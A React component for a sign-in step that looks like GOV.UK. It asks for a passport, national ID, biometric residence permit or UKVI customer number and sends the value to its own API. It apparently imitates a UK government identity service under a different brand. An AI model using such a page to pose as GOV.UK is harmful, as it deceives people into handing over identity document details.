import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { api, ApiError } from '../lib/api';
import { BetaBanner, BackLink, ErrorBanner } from '../components/greenwebproject';

// One config-driven page for the four document-entry screens. The original
// Blade views (passport / national-id / biometric / customer-number) differed
// only in copy and field name, so they collapse into this single component.
const CONFIG = {
    passport: {
        title: 'What is your passport number?',
        label: 'Passport number',
        hint: 'For example, 120382978',
        helpLink: 'I do not know my passport number',
    },
    national_id: {
        title: 'What is your national identity card number?',
        label: 'National identity card number',
        hint: 'For example, 12AB3456',
        helpLink: null,
    },
    biometric: {
        title: 'What is your biometric residence permit number?',
        label: 'Biometric residence permit number',
        hint: 'For example, 1234567890',
        helpLink: null,
    },
    customer_number: {
        title: 'What is your UKVI customer number?',
        label: 'UKVI customer number',
        hint: 'For example, 1234-5678-9012',
        helpLink: null,
    },
};

export default function DocumentEntry({ documentType }) {
    const navigate = useNavigate();
    const config = CONFIG[documentType];
    const [value, setValue] = useState('');
    const [error, setError] = useState(null);
    const [submitting, setSubmitting] = useState(false);

    useEffect(() => {
        document.title = `${config.title} - GOV.UK`;
    }, [config.title]);

    const handleSubmit = async (event) => {
        event.preventDefault();
        setError(null);
        setSubmitting(true);
        try {
            await api.post('/document', {
                document_type: documentType,
                document_number: value,
            });
            navigate('/id-question/date-of-birth');
        } catch (err) {
            setError(err instanceof ApiError ? err.message : 'Something went wrong. Please try again.');
            setSubmitting(false);
        }
    };

    return (
        <div className="max-w-2xl px-4 sm:px-0 mx-auto">
            <BetaBanner />
            <BackLink to="/id-question" size={16} />

            <p className="text-[16px] text-greenwebproject-grey mb-2">Sign in</p>

            <h1 className="text-[32px] md:text-[40px] font-bold text-greenwebproject-black mb-6 leading-[1.2]">{config.title}</h1>

            <ErrorBanner message={error} bold />

            <form onSubmit={handleSubmit} className="mb-8">
                <div className="mb-6">
                    <label htmlFor="document_number" className="block text-[16px] font-bold text-greenwebproject-black mb-2">
                        {config.label}
                    </label>
                    <p className="text-[16px] text-greenwebproject-grey mb-4">{config.hint}</p>
                    <input
                        type="text"
                        id="document_number"
                        name="document_number"
                        value={value}
                        onChange={(event) => setValue(event.target.value)}
                        className="w-full border-2 border-greenwebproject-mid-grey px-4 py-3 text-[16px] focus:outline-none focus:border-greenwebproject-blue focus:ring-4 focus:ring-greenwebproject-yellow"
                        required
                    />
                </div>

                <button
                    type="submit"
                    disabled={submitting}
                    className="inline-block bg-greenwebproject-green text-white font-bold text-[16px] px-6 py-3 shadow-[0_2px_0_#002d18] hover:bg-[#005a30] disabled:opacity-70 no-underline leading-[1.5]"
                >
                    Continue
                </button>
            </form>

            {config.helpLink && (
                <div className="mt-8 pt-8 border-t border-greenwebproject-mid-grey">
                    <p className="text-[16px] text-greenwebproject-black mb-4">
                        <a href="#" className="text-greenwebproject-blue underline hover:text-greenwebproject-dark-blue">
                            {config.helpLink}
                        </a>
                    </p>
                </div>
            )}
        </div>
    );
}
